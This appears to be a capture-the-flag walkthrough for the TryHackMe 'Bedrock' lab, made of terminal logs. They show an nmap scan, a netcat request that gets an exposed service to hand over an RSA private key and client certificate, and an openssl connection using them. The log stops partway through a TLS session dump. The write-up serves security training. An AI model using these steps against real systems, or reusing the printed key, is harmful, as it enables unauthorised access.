# Bedrock

## Nmap

```bash
┌──(ajay㉿ajay)-[~/tryhackme/bedrock]
└─$ nmap -v -p 22,80,4040,9009,54321 -A -sC -sV  10.201.123.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 10:12 CDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:12
Completed NSE at 10:12, 0.00s elapsed
Initiating NSE at 10:12
Completed NSE at 10:12, 0.00s elapsed
Initiating NSE at 10:12
Completed NSE at 10:12, 0.00s elapsed
Initiating Ping Scan at 10:12
Scanning 10.201.123.132 [4 ports]
Completed Ping Scan at 10:12, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:12
Completed Parallel DNS resolution of 1 host. at 10:12, 0.03s elapsed
Initiating SYN Stealth Scan at 10:12
Scanning 10.201.123.132 [5 ports]
Discovered open port 80/tcp on 10.201.123.132
Discovered open port 4040/tcp on 10.201.123.132
Discovered open port 22/tcp on 10.201.123.132
Discovered open port 54321/tcp on 10.201.123.132
Discovered open port 9009/tcp on 10.201.123.132
Completed SYN Stealth Scan at 10:12, 0.25s elapsed (5 total ports)
Initiating Service scan at 10:12
Scanning 5 services on 10.201.123.132
Stats: 0:02:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 10:15 (0:00:35 remaining)
Completed Service scan at 10:15, 164.50s elapsed (5 services on 1 host)
Initiating OS detection (try #1) against 10.201.123.132
Initiating Traceroute at 10:15
Completed Traceroute at 10:15, 3.05s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 10:15
Completed Parallel DNS resolution of 2 hosts. at 10:15, 0.02s elapsed
NSE: Script scanning 10.201.123.132.
Initiating NSE at 10:15
Completed NSE at 10:15, 7.01s elapsed
Initiating NSE at 10:15
Completed NSE at 10:15, 3.26s elapsed
Initiating NSE at 10:15
Completed NSE at 10:15, 0.00s elapsed
Nmap scan report for 10.201.123.132
Host is up (0.31s latency).

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f3:25:de:a3:76:ef:28:5e:a4:f7:ff:f4:f2:01:39:bf (RSA)
|   256 31:44:f3:59:eb:26:0e:b2:3a:55:27:a6:07:f2:72:5f (ECDSA)
|_  256 12:99:87:60:e9:6d:f2:98:1b:ce:d4:39:f7:dc:82:dc (ED25519)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://10.201.123.132:4040/
4040/tcp  open  ssl/yo-main?
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-04T15:08:05
| Not valid after:  2026-10-04T15:08:05
| MD5:   792d:cf59:b83d:c6ac:0cb3:1f29:7312:fc78
|_SHA-1: 0c52:171d:71df:21be:74f9:b4bf:433d:0c7b:0d51:3475
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Sat, 04 Oct 2025 15:12:41 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|     Need to try and secure
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Sat, 04 Oct 2025 15:12:42 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|_    Need to try and secure
9009/tcp  open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
54321/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-04T15:08:05
| Not valid after:  2026-10-04T15:08:05
| MD5:   792d:cf59:b83d:c6ac:0cb3:1f29:7312:fc78
|_SHA-1: 0c52:171d:71df:21be:74f9:b4bf:433d:0c7b:0d51:3475
| fingerprint-strings: 
|   Kerberos, NULL, afp, oracle-tns: 
|_    Error: 'undefined' is not authorized for access.
|_ssl-date: TLS randomness does not represent time
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4040-TCP:V=7.95%T=SSL%I=7%D=10/4%Time=68E1396F%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nDate:\x20Sat,\x2004\x20Oct\x202025\x2015:12:41\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x
SF:20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2035em;\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x20sans-serif;
SF:\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x20\x20</head>\
SF:n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20ABC!</h1>\n\x20
SF:\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n\n\x20\x20\x2
SF:0\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x20a\x20website
SF:!\x20Can\x20you\x20believe\x20this\x20technology\x20exists\x20in\x20bed
SF:rock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helping\x20to\x20se
SF:tup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info\x20was\x20im
SF:portant\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\x20only\x20fi
SF:gured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll\x20is\x20a\x
SF:20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a\x20sql\x20da
SF:tabase,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLooks\x20like\x
SF:20it\x20started\x20something\x20else,\x20but\x20I'm\x20not\x20sure\x20h
SF:ow\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x20was\x20from\
SF:x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20try\x20and\x2
SF:0secure\x20")%r(HTTPOptions,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type
SF::\x20text/html\r\nDate:\x20Sat,\x2004\x20Oct\x202025\x2015:12:42\x20GMT
SF:\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<he
SF:ad>\n\x20\x20\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\
SF:x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2
SF:035em;\n\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x
SF:20sans-serif;\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x2
SF:0\x20</head>\n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20AB
SF:C!</h1>\n\x20\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n
SF:\n\x20\x20\x20\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x2
SF:0a\x20website!\x20Can\x20you\x20believe\x20this\x20technology\x20exists
SF:\x20in\x20bedrock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helpin
SF:g\x20to\x20setup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info
SF:\x20was\x20important\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\
SF:x20only\x20figured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll
SF:\x20is\x20a\x20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a
SF:\x20sql\x20database,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLo
SF:oks\x20like\x20it\x20started\x20something\x20else,\x20but\x20I'm\x20not
SF:\x20sure\x20how\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x2
SF:0was\x20from\x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20
SF:try\x20and\x20secure\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9009-TCP:V=7.95%I=7%D=10/4%Time=68E1395A%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port54321-TCP:V=7.95%T=SSL%I=7%D=10/4%Time=68E13964%P=x86_64-pc-linux-g
SF:nu%r(NULL,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x
SF:20access\.\n")%r(Kerberos,31,"Error:\x20'undefined'\x20is\x20not\x20aut
SF:horized\x20for\x20access\.\n")%r(oracle-tns,31,"Error:\x20'undefined'\x
SF:20is\x20not\x20authorized\x20for\x20access\.\n")%r(afp,31,"Error:\x20'u
SF:ndefined'\x20is\x20not\x20authorized\x20for\x20access\.\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Uptime guess: 15.834 days (since Thu Sep 18 14:13:53 2025)
Network Distance: 5 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   30.50 ms  10.17.0.1
2   ... 4
5   614.47 ms 10.201.123.132

NSE: Script Post-scanning.
Initiating NSE at 10:15
Completed NSE at 10:15, 0.00s elapsed
Initiating NSE at 10:15
Completed NSE at 10:15, 0.00s elapsed
Initiating NSE at 10:15
Completed NSE at 10:15, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 182.34 seconds
           Raw packets sent: 60 (4.550KB) | Rcvd: 35 (3.198KB)

```

![image.png](image.png)

```bash
┌──(ajay㉿ajay)-[~/tryhackme/bedrock]
└─$ nc 10.201.123.132 9009                                                                    

 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               

What are you looking for? flag
Sorry, unrecognized request: 'flag'

You use this service to recover your client certificate and private key
What are you looking for? private key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA1A4AwZPakQhnJzDroxmVWa0f7HoiOdyRbTt/jPdUb/Ei/Kwl
Za0bMi6Jx3cR7y7UC5AdbeGgb72YcP8BWk63siPlpys1YhsCHYFLzY11FUzMdzaZ
VoBp+M7Q/PFkL6NyOWvqXTVN8Y3MHWjdrmGb1iz9ifVoEGI3tH8fxX7+XsyH/CxG
bX+ZGW+iRde/oXuiJTPyRDkw0rxiBSL5qUHpzyPUICEaxOrV21RfEYggMhgjCuZ+
+w+NHwKFfF062QlSbpP/DlJUjnT4xpARQQzLJPZqfk5AQPlr6iUDJ9goumAANSKX
ottP+Mnm+RRG009jpfpq4YBclWrc2KtggKrSwwIDAQABAoIBAQCHZU18TCBxHDFo
56Z85FflA1Jv1mfGFBxS53uAkWc7dncFaBEUw5uqxeY5EsDDvF2t6F2yDC85SZBt
DZVaiQpnVt5Kh581PdNy7VxuKZUJfZjLwXPUtHd1YvAzoRl8BVtoaIwi6WcUBZq/
aHaq4i3zaZSVIrlIRL4WpFiv7G8ULU/L+yYzDyFdVukzTSLeJHo9sK/ALHsd/GJu
IAHNVkKkUfVt0oUNPB3IAvBolI9OrbSjhTDXPyfEBaaJxxgbKhLlum0tHTHvy/Ut
eSLR7uQL79z6V6Bih0VIDyF37d/xKDD3V08wGqD6xZ8AKhw9JOvlp/uG0YDqT1oy
/M08S4nRAoGBAPejLSzq1s1XytoOKTYiV/WhFscWTc09Npl+LMl0HQ0iMsBAILhw
V7VMh6Nsyav+RTohyhq4QlOmPqeSCAu7ygX4TsZ1muNIcDAWHvRZA3ajR1uufp9G
eMs6fdXDxazcA135W3h14PSORYIirkfqOB5zqya7WS5AHAyvK2ybhOupAoGBANs3
NtgVzyVa5j7b6AgC6KvcRajoTz+SXmzDUT8PPmXdMHKP0MtczuqfU18NpweMbym6
OysM8lEV3jmf+qQdqxT8ok3iHBesCj9PoCBko8fVpsGqM33ZXUYj9NC2NTi7Q1w6
7o9i2kGjp2UzI0EHwi73iunuSoTlNaEL9obgAq6LAoGARgdSDiK27cjG55UbmGBr
6V1NmK05ATIvT4a72ZhJYt5p5a380suKMg3bSZ7JBSdZok/N3HKA5zDbBP4p4k+P
mNKYTE0TqPRiLWcEB+toLFOOKWIWEqqWHDqFPT8olnJ9TUTn1g/XtrDI/T0bdeDJ
T+s72i8e0BJ3HCspJ4RvOUkCgYEArcBoxwMaSehvgLk6g0cS9k1EJWnkjmXMU/bH
6eyCL6kO4m7dNqMcGlkocrnWfyQvY+qJRUkgs2Za2l/UAMrHNH49gu/KBnVFNgM9
zw8VxamxX+UwpPppdNPBEsCpFItRC8RmG95lUguN/ad3tO6aWjG4uEw4Yndud3SM
9UCOv5sCgYEAnltadf53G4cXlKd01G0/x7UyRzkNKJhG6TwcWdzl69gLiNZhH3rM
BV73havYBXx8+GqUMDk2hwtxDL5gs8CVeoglcrvy1w+pael/IgpdsonummydfVkC
ql7tMyqEU3ZvU3G0BGfnxGY5DJJHXe/6eRxueqJNx52n4Ih6AfAYJVo=
-----END RSA PRIVATE KEY-----

What are you looking for? client certificate
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNTEwMDQxNTA4MDVaFw0yNjEwMDQxNTA4MDVaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDUDgDB
k9qRCGcnMOujGZVZrR/seiI53JFtO3+M91Rv8SL8rCVlrRsyLonHdxHvLtQLkB1t
4aBvvZhw/wFaTreyI+WnKzViGwIdgUvNjXUVTMx3NplWgGn4ztD88WQvo3I5a+pd
NU3xjcwdaN2uYZvWLP2J9WgQYje0fx/Ffv5ezIf8LEZtf5kZb6JF17+he6IlM/JE
OTDSvGIFIvmpQenPI9QgIRrE6tXbVF8RiCAyGCMK5n77D40fAoV8XTrZCVJuk/8O
UlSOdPjGkBFBDMsk9mp+TkBA+WvqJQMn2Ci6YAA1Ipei20/4yeb5FEbTT2Ol+mrh
gFyVatzYq2CAqtLDAgMBAAEwDQYJKoZIhvcNAQELBQADggEBADxviiAYjQXhrQxu
u/OXjDK4eKeJeIVLqEVe4I1FbS1aMs5fx8qXf9nrRFV1CFdA5Tn0+ZNV2Km6I8I+
eRVNKzObCt3eS44bW+DwH7ooD0UPkh2ugAEQ6xjNJ5NKoeJwSjFVx9RaIotazk0l
o8Ry3IrTPZtxnM/HABE0DB/SWhTNuRkt8aSIyjbeIlel/1Ie1YtbtVuFdURxDOQZ
B1eWmvBj+pdn7r7SvxgkfTzNjQqqE4CD9cM3j1C07TmMDD3V4DGt0w02b5afQ8Ok
4mhwLyLQ8zavAHUmbNkFKD2pN0tbaZrfql7nLxmTAXRsD1l2zmf+4v94mznqVr+X
QEBh4hY=
-----END CERTIFICATE-----

What are you looking for? ^C
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/bedrock]
└─$ nano id_rsa                 
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/bedrock]
└─$ chmod 600 id_rsa   
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/bedrock]
└─$ nano certificate 
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/bedrock]
└─$ ls
certificate  id_rsa

```

```bash
┌──(ajay㉿ajay)-[~/tryhackme/bedrock]
└─$ openssl s_client -connect 10.201.123.132:54321 -cert certificate -key id_rsa 
Connecting to 10.201.123.132
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN=localhost
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=localhost
verify return:1
---
Certificate chain
 0 s:CN=localhost
   i:CN=localhost
   a:PKEY: RSA, 2048 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: Oct  4 15:08:05 2025 GMT; NotAfter: Oct  4 15:08:05 2026 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIICrzCCAZcCFDEEo/pysNM5o9L+VEpHrLEwyG+9MA0GCSqGSIb3DQEBCwUAMBQx
EjAQBgNVBAMMCWxvY2FsaG9zdDAeFw0yNTEwMDQxNTA4MDVaFw0yNjEwMDQxNTA4
MDVaMBQxEjAQBgNVBAMMCWxvY2FsaG9zdDCCASIwDQYJKoZIhvcNAQEBBQADggEP
ADCCAQoCggEBALDQV4OUbE6pwYjKPIau5HdL1NKPuUZbbW0dFBpcZa/JVioHHF7D
4n/9B3+HoCLfCwo3Y+PcvKk1d94yuoxW/IPvotFoxkrnsJ44HiKWDxI1arwAWGMj
iYJz1PnqW/ygoU2wfW3mkdvg9TYT7UF+1Nelr5G/EZcS9zbQSAyySTF7EXBdxuCy
1PzTsh3cKHKEnjvgRJDHuJ0qhRurysdxTxuUiPzJdoBtcaL3sMyxguTcphJUtyL9
4yIIX3dR6OmpSqdKCkuSbNWd1eMfQmzfyB5KTtCdVUFzf24m2D7ARzwRys4yvUcw
Dx3wYW4ZdG3fPz8nj7uoxh+82sOxcqjojwECAwEAATANBgkqhkiG9w0BAQsFAAOC
AQEAcobC0FDt3lXuzEMwMeaXTzRODLq/6oPa2OdGcoKWieHfFM65m5d9286PiVnv
9T0OX5t79cQYaSJcfC/b2tdE8r3tqyt6y5zcHDNWX5qSbiT8iDstE2PD9WCi1De1
KsywDJU5mnknkKyha5aDDEUk9sUH6qnIwcFYjprOb/b+nc+hwIU7Z0cUjOlBO8mD
W0WXNkel0pDrMg4W1vzLgeSyx/2Tyv9coSOGD2+oBCcn76xYKrQeCa8yN/vUCYKw
ZlpYibcgSuuTE8aRzmp5DvSWeQjTJiyxHdGjDZyzK0qzQ/VEy/e7v64OrhxGk26w
uoOih5h3CWQH81p67bwfW12Dtw==
-----END CERTIFICATE-----
subject=CN=localhost
issuer=CN=localhost
---
Acceptable client certificate CA names
CN=localhost
Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:ed25519:ed448:rsa_pss_pss_sha256:rsa_pss_pss_sha384:rsa_pss_pss_sha512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:ECDSA+SHA1:RSA+SHA224:RSA+SHA1
Shared Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:ed25519:ed448:rsa_pss_pss_sha256:rsa_pss_pss_sha384:rsa_pss_pss_sha512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512
Peer signing digest: SHA256
Peer signature type: rsa_pss_rsae_sha256
Peer Temp Key: X25519, 253 bits
---
SSL handshake has read 1348 bytes and written 2738 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Protocol: TLSv1.3
Server public key is 2048 bit
This TLS version forbids renegotiation.
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self-signed certificate)
---

 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: AB46E7931614E2BFC44EA2B0ACF3C91AB7EE2C340E97FD01F336C93979181C4B
    Session-ID-ctx: 
    Resumption PSK: 6E6FBF5753E4667546CA757B1C21B34550D1968CC30D80128B988E15BE25AB973CB08A98BF9868F0DDD24A1816D46D10
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 80 26 66 7c 0a bb 6a 14-43 7b 11 1f de 87 99 31   .&f|..j.C{.....1
    0010 - 0a cb b6 e0 3c f7 5d fa-94 7f df af 56 ea bd 84   ....<.].....V...
    0020 - ca d7 33 5f 7e 51 7d 49-8e 16 6c cd 0a 4f 66 f8   ..3_~Q}I..l..Of.
    0030 - 87 9b f8 f1 5d f5 5c be-e4 7a 72 ac c1 40 16 8a   ....].\..zr..@..
    0040 - 07 ee a4 4b 11 d6 0e 56-f5 4f c6 04 83 d2 96 e1   ...K...V.O......
    0050 - 69 ed c2 b1 31 20 e8 6a-3d cc 82 fd ba 6e 3d 66   i...1 .j=....n=f
    0060 - 5b fb 65 81 2b 60 6d 10-87 d4 8a 57 e6 41 94 3e   [.e.+`m....W.A.>
    0070 - 05 41 7f 71 b1 c8 1e 5d-b8 31 9c 22 57 e9 50 d1   .A.q...].1."W.P.
    97 97 c7 24 b3 77 c4-86 a6 16 18 eb 86 1f fc   ....$.w.........
    0270 - 8f e0 96 e2 3a ad 29 34-c4 31 0b 5f fa 06 4d 61   ....:.)4.1._..Ma
    0280 - 1e 4b d8 2a 12 20 2f d5-5d 1f a8 81 83 22 ae d4   .K.*. /.]...."..
    0290 - ee f0 68 d7 9e 8d 61 0a-1e 32 bf 0f 18 d8 53 ad   ..h...a..2....S.
    02a0 - ae dd 7a cf 74 55 f9 46-2e dc 08 3c fb 4c 06 7b   ..z.tU.F...<.L.{
    02b0 - e0 d6 4b c6 70 6a 6e cc-9e 99 5b 8c 62 f7 82 7a   ..K.pjn...[.b..z
    02c0 - 66 54 63 8d 94 8a eb 1f-7f 5a 9c c7 8d b2 cd f5   fTc......Z......
    02d0 - 2b 0d d3 5f c2 f2 a7 d8-5a 28 cf 33 56 cf 0b bc   +.._....Z(.3V...
    02e0 - 0e b4 23 4a 7d 89 13 68-3d 22 64 cc 40 90 c2 bc   ..#J}..h="d.@...
    02f0 - e3 1f b2 05 d1 39 11 98-90 f1 73 e1 37 a3 f9 05   .....9....s.7...
    0300 - 78 ee e1 c8 db 48 ee 2b-d7 f9 df e8 7c 9f cb 32   x....H.+....|..2
    0310 - a8 43 2a 6e d0 e3 59 b8-e7 36 39 3c 00 68 00 a6   .C*n..Y..69<.h..
    0320 - da 41 45 d1 f0 79 78 ac-7f 27 01 59 3e 8f aa ad   .AE..yx..'.Y>...
    0330 - ff fd 82 3f b5 2e 73 5f-0c 76 68 28 60 67 65 80   ...?..s_.vh(`ge.
    0340 - 01 0e 46 35 a9 59 a1 0e-3e 86 c0 fe d7 7f 4b 69   ..F5.Y..>.....Ki
